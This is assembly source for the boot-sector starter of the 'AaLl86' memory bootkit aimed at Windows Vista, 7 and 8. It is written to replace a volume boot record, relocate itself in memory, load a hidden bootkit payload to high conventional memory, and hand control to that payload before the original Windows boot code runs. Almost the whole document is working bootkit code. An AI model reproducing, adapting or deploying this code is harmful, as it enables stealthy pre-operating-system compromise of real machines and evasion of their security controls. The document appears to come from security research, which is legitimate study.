;AaLl86 Windows Vista/Seven/Eight x86 Memory Bootkit
;Starter program
;Compile with FASM: https://flatassembler.net/
;Copyright© 2013 Andrea Allievi

INCLUDE "RamBootkit.inc"
ORG 0600h

use16

main:
jmp start
SIGNATURE db 0,0,"AaLl86",0
STARTER_TYPE db 2                       ; Starter type: 2 - Volume boot record
VBR_ORG_HIDDEN_SECTORS dd 003Fh         ; Original VBR hidden sectors
BOOTKIT_PROGRAM_SIZE dw 02h             ; Bootkit program size (in sector)
;ORIGINAL_MBR_SECT dd 12h                ; Original MBR Sector LODWORD
;WINDOWS_MBR_SECT dd 01h                 ; Standard Windows MBR Sector
BOOT_DRIVE db 80h                       ; Boot Drive: 0x80 = First HD    0x81 = Second Hard Disk    0x00 = First Floppy    0x01 = Second floppy
CUR_DRIVE db 80h                        ; Current Drive (filled at routime)
START_STRING db "Starting Memory Bootkit...", 0Dh, 0Ah, 00h

; Windows Xp NTFS Main offset: 0x06A
; Windows Vista NTFS Main offset: 0x07A
; Windows 7 NTFS Main offset: 0x07A
; Windows 8 NTFS Main offset:  0x119

     nop
     nop
     nop

;------------------------------------------------------------------------------------------------
; WriteMessage Procedure
; Input param: DS:SI = Output string buffer
WriteMessage:
     push ax
     push bx
   .WMStart:
     lodsb
     cmp al, 0
     jz .WMExit
     mov bx, 0Fh        ; Set White color
     mov ah, 0Eh        ; Teletype output
     int 10h
     jmp .WMStart

   .WMExit:
     pop bx
     pop ax
     ret
;------------------------------------------------------------------------------------------------
     nop
     nop

;------------------------------------------------------------------------------------------------
; FatalError Procedure
; Display a fatal system error string and loop in an endless loop
FatalError:
    mov ax, cs
    mov ds, ax
    mov si, FATAL_ERR_STRING
    call WriteMessage
    cli
    hlt
    jmp FatalError
;------------------------------------------------------------------------------------------------
    nop
    nop

;----------------------------------------------------------
; Boot Drive index not current code stub:
boot_drv_not_current:
    ; Set boot drive as current drive
    mov dl, byte [cs:BOOT_DRIVE]
    mov si, START_STRING
    call WriteMessage
    jmp _continue
;----------------------------------------------------------

times 06Ah-($-main) db 90h
; This must start @07C0:026A - Windows Xp compatibility
    jmp start
    nop
    nop

times 07Ah-($-main) db 90h
; This must start @07C0:027A
; Memory layout: 07C00 - Free sector
;                07E00 - This starter program (size 0x200 bytes)
;                08000 - Bootkit main application (size 0x400 bytes)
start:
    ;push ds
    ;push es
    ;pushad      ; Save all old GP registers
    cli        ; Clear interrupts

    ;First of all, copy myself in a new location (0600:000)
    xor    ax, ax
    mov    ds, ax               ; ds = 0
    mov    es, ax               ; es = 0
    mov    si, VBRLOADLOC       ; si = 0x7E00
    mov    di, 600h             ; di = 0x0600
    mov    cx, 100h             ; MOVSW = move word from address DS:SI to ES:DI.
                                ; REP MOVSW = Move CX words from DS:[SI] to ES:[DI].
    rep movsw
    push es
    push from_new_selector
    retf

; This starts from 0060:xxxx
from_new_selector:
    sti                    ; Abilita gli interrupt

    ; Save current drive in a variable
    mov dl, BYTE [ds:07C0Eh]              ; Current drive index is located in 0x7c0e (NTFS bootstrap code)
    mov byte [cs:CUR_DRIVE], dl
    cmp dl, byte [cs:BOOT_DRIVE]
    jnz boot_drv_not_current

_continue:
    ; Copy entire bootkit application to 9f00:0000
    mov si, VBRLOADLOC + 200h    ; Starting segment: 0800
    mov ax, CODEBASEIN1MB
    mov es, ax          ; Target segment: 9F00
    mov cx, word [cs:BOOTKIT_PROGRAM_SIZE]
    shl cx, 9           ; CX = Sector size * SizeofSector
    xor di, di
    rep movsb

    ; Reset DS and ES segment registers
    xor ax, ax
    mov es, ax

    ; Now read original MBR sector in 0x7A00
    pushd 0
    pushd 0
    mov bx, sp
    mov cx, 1          ; Number of sectors to read: 1
    mov di, 800h       ; Buffer: 0x0000:0x800
    call ReadSector
    jc FatalError
    add sp, 08h

    ; Analize MBR Sector and get real boot partition hidden sectors
    mov cx, 4
    mov bp, 9BEh

_search_Vbr:
    cmp byte [ds:bp+0], 0
    jl _Vbr_Found
    add bp, 10h
    loop _search_Vbr
    jmp FatalError

_Vbr_Found:
    ; Restore original hidden sectors number
    mov ebx, dword [ds:bp+8]
    pushd 0             ; Sector number HIDWORD
    pushd ebx           ; Sector number LODWORD
    mov bx, sp
    ; Reread original boot sector
    mov di, LOADLOC
    mov cx, 1
    call ReadSector
    jc FatalError
    popd ebx
    add sp, 4

    mov dword [cs:LOADLOC+01Ch], ebx
    ; Well done, jump to original VBR sector
    jmp Exit

times 0119h-($-main) db 90h
; This must start @07C0:0119 - Windows 8 Compatibility
    jmp start
    nop
    nop

Exit:
    ;popad
    ;pop es
    ;pop ds

    ; Original VBR registers:
    ; AX = 0, BX = 0x7C00, CX = 0x21, DX = 0x2080, SP = 0x7C00, BP = 0
    ; ESI = 7BE, EDI = 0; All segment registers are set to 0
    xor ax, ax
    mov cx, 021h
    mov bx, LOADLOC
    mov dx, ax
    mov sp, bx
    mov bp, ax

    mov dl, byte [cs:CUR_DRIVE]        ; Initialize the actual boot drive
    jmp far CODEBASEIN1MB:00h



;--------------------------------------------------------------------------------------------------
; ReadSector Procedure
; Input param: CS:BX = Sector descriptor offset
;              CX = Number of sector to read
;              DL = Hard disk drive index to read from
;              ES:DI = Destination buffer
ReadSector:
    ; Check Drive Extension presence
    push bx
    push cx
    mov ah, 041h
    mov bx, 055AAh
    int 13h
    pop cx
    jc DontUseExt
    cmp bx, 0AA55h
    jnz DontUseExt

    ; Actually Ext. Read a sector:
    pop bx
    xor ax, ax
    mov ah, 042h
    pushd dword [cs:bx+4]           ; HIDWORD of absolute sector to read
    pushd dword [cs:bx]             ; LODWORD of absolute sector to read
    push es                         ; Selector of pointer to memory buffer (little endian)
    push di                         ; Offset of pointer to memory buffer
    push cx                         ; Number of sector to read
    push 010h                       ; Sizeof (DAP)
    mov si, sp
    int 13h
    add sp, 10h
    retn

DontUseExt:
    ; If we are here we can't use Drive Extension, use regular Read (if possible)
    ; Read original MBR:
    pop bx
    mov ah, 02h
    mov al, cl          ; Number of sector to read
    mov cl, byte [cs:bx]
    inc cl              ; In CHS addressing Sector always start with zero
    mov ch, 00h         ; Track number
    mov dh, 00h         ; Head number
    mov bx, di          ; Restore output buffer
    int 13h
    retn
;------------------------------------------------------------------------------------------------
    nop
    nop

FATAL_ERR_STRING db "A fatal system error occured while reading from hard-disk...", 0Dh, 0Ah
                 db "System is halted!", 0Dh, 0Ah

ends:
times 510-($-main) db 0   ; 512 total bytes
signa   db 55h,0aah       ; signature
